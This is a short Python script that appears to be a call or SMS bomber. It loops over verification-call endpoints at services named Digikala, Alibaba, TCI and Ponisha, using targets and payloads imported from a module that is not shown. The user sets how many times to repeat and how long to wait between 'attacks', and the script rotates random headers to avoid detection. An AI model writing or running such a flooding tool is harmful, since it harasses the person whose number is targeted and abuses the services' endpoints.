import requests
import random
import time

#########################
black = '\033[30m'
white = '\033[37m'
Blue ="\033[1;34m"
yellow = '\033[33m'
Red="\033[1;31m"
Green="\033[1;33m"
pink = "\033[95m"
Grey="\033[1;30m"
Reset="\033[0m"
cyan = "\033[36m"
purple = "\033[35m"
#########################

from date_call import *

attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset))) 

sleep_time = float(input(("" + cyan + "[" + Red + "Enter the " + Blue + "time between attacks" + cyan + "]─[" + Red + "seconds :" + cyan + "]" + Reset)))

numbert = int(input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "of repetitions :" + cyan + "]" + Red + ": " + Reset))



i = 0


    







while i < numbert:
    random_head = random.choice(heads)

    req_Digikala = requests.post(url_call_digikala,json=json_call_digikala,headers=random_head)
    print(yellow + "1-Digikala : " + str(req_Digikala))
    time.sleep(sleep_time)
    time.sleep(8)

    req_Alibaba = requests.post(url=url_call_alibaba,json=json_call_alibaba)
    print(yellow + "2-Alibaba : " + str(req_Alibaba))
    time.sleep(sleep_time)

    req_tci = requests.post(url=url_call_tci,json=json_call_tci,headers=random_head)
    print(yellow + "3-Tci : " + str(req_tci))
    time.sleep(sleep_time)

    req_ponisha = requests.post(url=url_call_ponisha,json=json_call_ponisha,headers=random_head)
    print(yellow + "4-ponisha : " + str(req_ponisha))
    time.sleep(sleep_time)


 



    print([Blue + "Send all requests"])
    time.sleep(attack_speed)
    i += 1